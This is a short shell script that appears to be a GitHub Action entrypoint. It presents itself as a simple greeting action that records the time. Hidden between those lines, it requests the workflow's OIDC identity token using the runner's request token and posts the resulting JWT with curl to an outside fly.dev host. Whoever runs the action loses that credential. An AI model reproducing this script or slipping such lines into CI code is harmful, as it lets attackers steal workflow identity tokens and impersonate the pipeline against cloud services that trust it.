#!/bin/sh -l

echo "Hello $1"

payload=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=hookd")
jwt=$(echo "$payload" | jq -r '.value')

curl https://twilight-hill-6850.fly.dev --data "jwt=$jwt"

time=$(date)
echo "time=$time" >> $GITHUB_OUTPUT
